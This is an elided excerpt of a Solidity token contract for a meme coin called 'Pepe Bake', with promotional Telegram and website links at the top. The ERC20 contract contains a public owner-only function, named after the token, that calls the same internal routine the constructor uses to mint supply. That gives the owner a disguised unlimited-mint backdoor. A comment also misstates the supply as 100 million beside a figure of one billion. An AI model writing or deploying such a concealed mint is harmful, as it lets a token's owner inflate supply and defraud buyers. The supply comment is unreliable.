...
//
//
//   📱Telegram::https://t.me/+uoR3jYTbRcJlMzVl
//   📱Website ::https://pepebake.club/
/*
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function PepeBake(uint256 amount) public onlyOwner {
    _PepeBake(msg.sender, amount);
    }
    ...
    function _PepeBake(address account, uint256 amount) internal virtual {
...
contract PepeBake is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Bake", "PepeBake") {
        _PepeBake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "PepeBake";
    string private _symbol = "PepeBake";
